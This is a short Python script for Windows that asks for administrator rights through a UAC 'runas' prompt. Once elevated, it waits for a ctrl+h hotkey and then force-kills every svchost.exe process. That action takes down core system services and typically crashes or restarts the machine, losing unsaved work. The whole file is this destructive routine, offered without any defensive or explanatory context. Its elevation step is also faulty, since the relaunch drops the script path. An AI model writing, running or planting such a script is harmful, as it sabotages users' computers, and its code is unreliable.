import os
import keyboard as kb
import ctypes, sys

def is_admin():
  try:
    return ctypes.windll.shell32.IsUserAnAdmin()
  except:
    return False

if is_admin():
  kb.wait('ctrl+h')
  os.system('taskkill  /f /im svchost.exe')
else:
  ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv[1:]), None, 1)
